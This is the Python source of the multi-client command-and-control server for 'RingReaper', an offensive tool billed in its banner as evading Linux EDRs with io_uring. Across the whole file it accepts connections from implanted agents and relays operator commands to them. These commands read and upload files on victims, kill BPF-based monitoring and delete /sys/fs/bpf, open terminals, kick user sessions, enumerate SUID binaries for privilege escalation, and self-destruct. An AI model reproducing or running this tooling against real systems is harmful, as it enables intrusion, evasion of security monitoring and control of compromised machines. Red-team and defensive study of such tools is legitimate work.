import socket
import argparse
import sys
import os
import threading
import random
import string
from contextlib import suppress

try:
    import readline
    HISTFILE = os.path.expanduser("~/.ringreaper_history")
    try:
        readline.read_history_file(HISTFILE)
    except FileNotFoundError:
        pass
except Exception:
    readline = None
    HISTFILE = None

BANNER = r"""


██████╗ ██╗███╗   ██╗ ██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
██████╔╝██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
██╔══██╗██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
██║  ██║██║██║ ╚████║╚██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                                                              
   @MatheuZSecurity || Rootkit Researchers || https://discord.gg/66N5ZQppU7

   	          --- EVADING LINUX EDRS WITH IO_URING ---
                               [version 2.0]

"""

HELP_TEXT = '''
Available commands (server-side):
  list                        - List current connections with IDs
  use <id>                    - Select active connection by 5-digit ID
  clear                       - Clear the console
  help                        - This help

Agent commands (sent to the selected connection only):
  get <path>                  - See file
  put <local> <remote>        - Upload file
  killbpf                     - Kill processes that have bpf-map and delete /sys/fs/bpf/*
  terminal                    - Get a pts terminal
  users                       - View logged users
  ss/netstat                  - View connections
  ps                          - List processes
  me                          - Show agent PID and TTY
  kick <pts>                  - Kill session by pts
  privesc                     - Enumerate SUID binaries
  selfdestruct                - Delete agent and exit
  exit                        - Close connection (without deleting the agent)
'''

connections = {}
connections_lock = threading.Lock()
current_id = None

print_lock = threading.Lock()
waiting_input = False

def get_prompt():
    pid = current_id if current_id else "-----"
    return f"root@nsa[{pid}]:~#  "

def notify(msg: str):
    global waiting_input
    with print_lock:
        if waiting_input:
            sys.stdout.write("\r")
            sys.stdout.write(msg.rstrip() + "\n")
            sys.stdout.write(get_prompt())
            sys.stdout.flush()
        else:
            print(msg, flush=True)

def gen_id(existing):
    import random, string
    while True:
        cid = ''.join(random.choices(string.digits, k=5))
        if cid not in existing:
            return cid

def accept_loop(host, port):
    global current_id
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(50)
        while True:
            try:
                sock, addr = srv.accept()
            except OSError:
                break
            with connections_lock:
                cid = gen_id(connections)
                connections[cid] = {'sock': sock, 'addr': addr}
                if current_id is None:
                    current_id = cid
            notify(f"[+] New connection {addr} -> ID {cid}")

def print_list():
    with connections_lock:
        if not connections:
            notify("[i] No active connections.")
            return
        lines = ["", "ID     Address             Selected", "-----------------------------------"]
        for cid, meta in connections.items():
            addr = f"{meta['addr'][0]}:{meta['addr'][1]}"
            mark = "<--" if cid == current_id else ""
            lines.append(f"{cid}   {addr:<18} {mark}")
        lines.append("")
        notify("\n".join(lines))

def get_current():
    with connections_lock:
        if current_id and current_id in connections:
            return current_id, connections[current_id]['sock']
    return None, None

def remove_connection(cid, reason=""):
    with connections_lock:
        meta = connections.pop(cid, None)
    if meta:
        with suppress(Exception):
            meta['sock'].shutdown(socket.SHUT_RDWR)
        with suppress(Exception):
            meta['sock'].close()
        if reason:
            notify(f"[-] Connection {cid} closed: {reason}")
        else:
            notify(f"[-] Connection {cid} closed.")

def recv_response(sock):
    data = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            return data, False
        data += chunk
        if len(chunk) < 4096:
            break
    return data, True

def main():
    global current_id, waiting_input
    parser = argparse.ArgumentParser(description="RingReaper server (multi-client)")
    parser.add_argument("--ip", required=True, help="IP address to listen on")
    parser.add_argument("--port", required=True, type=int, help="Port to listen on")
    args = parser.parse_args()
    print(BANNER)
    print("[*] Commands: 'list', 'use <id>', 'clear', 'help' (server). Others are sent to the selected agent.\n")
    print(f"[+] Listening on {args.ip}:{args.port} ...")
    t = threading.Thread(target=accept_loop, args=(args.ip, args.port), daemon=True)
    t.start()
    try:
        while True:
            with print_lock:
                waiting_input = True
                prompt = get_prompt()
            try:
                cmd = input(prompt).strip()
                if readline:
                    try:
                        if cmd:
                            readline.add_history(cmd)
                    except Exception:
                        pass
            finally:
                with print_lock:
                    waiting_input = False
            if not cmd:
                continue
            if cmd == "help":
                notify(HELP_TEXT)
                continue
            if cmd == "list":
                print_list()
                continue
            if cmd == "clear":
                os.system("cls" if os.name == "nt" else "clear")
                continue
            if cmd.startswith("use "):
                parts = cmd.split()
                if len(parts) != 2:
                    notify("[!] Usage: use <id>")
                    continue
                target = parts[1]
                with connections_lock:
                    if target in connections:
                        current_id = target
                        addr = connections[current_id]['addr']
                        notify(f"[+] Selected connection: {current_id} ({addr[0]}:{addr[1]})")
                    else:
                        notify(f"[!] Unknown id: {target}")
                continue
            cid, sock = get_current()
            if not sock:
                notify("[!] No selected connection. Use 'list' and 'use <id>' first.")
                continue
            if cmd.startswith("put "):
                parts = cmd.split()
                if len(parts) != 3:
                    notify("[!] Usage: put <local_path> <remote_path>")
                    continue
                local_path, remote_path = parts[1], parts[2]
                try:
                    size = os.path.getsize(local_path)
                except Exception as e:
                    notify(f"[!] Failed to stat local file: {e}")
                    continue
                try:
                    sock.sendall(f"recv {remote_path} {size}\n".encode())
                    notify(f"[+] [{cid}] Sent: recv {remote_path} {size}")
                    with open(local_path, "rb") as f:
                        while True:
                            chunk = f.read(4096)
                            if not chunk:
                                break
                            sock.sendall(chunk)
                    notify(f"[+] [{cid}] Upload done: {local_path} -> {remote_path}")
                except (BrokenPipeError, ConnectionResetError):
                    remove_connection(cid, "peer reset during upload")
                except Exception as e:
                    notify(f"[!] Upload error: {e}")
                continue
            try:
                sock.sendall(cmd.encode() + b"\n")
            except (BrokenPipeError, ConnectionResetError):
                remove_connection(cid, "peer reset when sending")
                continue
            except Exception as e:
                notify(f"[!] Send error: {e}")
                continue
            try:
                data, alive = recv_response(sock)
            except (BrokenPipeError, ConnectionResetError):
                remove_connection(cid, "peer reset when receiving")
                continue
            except Exception as e:
                notify(f"[!] Receive error: {e}")
                continue
            try:
                out = data.decode(errors="ignore")
            except Exception:
                out = ""
            if out:
                notify("[+] Output:\n" + out)
            if not alive:
                remove_connection(cid, "client closed")
                with connections_lock:
                    if current_id == cid:
                        current_id = next(iter(connections), None)
    except KeyboardInterrupt:
        notify("\n[-] Shutting down. Closing all connections...")
        with connections_lock:
            ids = list(connections.keys())
        for cid in ids:
            remove_connection(cid, "server shutdown")
        notify("[-] Bye.")
    finally:
        if readline and HISTFILE:
            try:
                readline.write_history_file(HISTFILE)
            except Exception:
                pass

if __name__ == "__main__":
    main()
